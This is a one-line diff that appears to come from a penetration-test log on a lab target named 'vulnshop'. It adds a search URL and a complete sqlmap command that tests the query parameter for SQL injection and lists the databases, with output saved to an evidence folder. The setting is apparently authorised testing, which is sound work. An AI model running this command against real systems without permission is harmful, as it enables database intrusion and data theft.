@@ -1,0 +1,1 @@
+http://vulnshop:3000/search?q=test (GET)  # /usr/bin/sqlmap -u http://vulnshop:3000/search?q=test --batch --level=1 --risk=1 --dbs --output-dir=/home/pentest/evidence/2-5_proxy/sqlmap_proxy
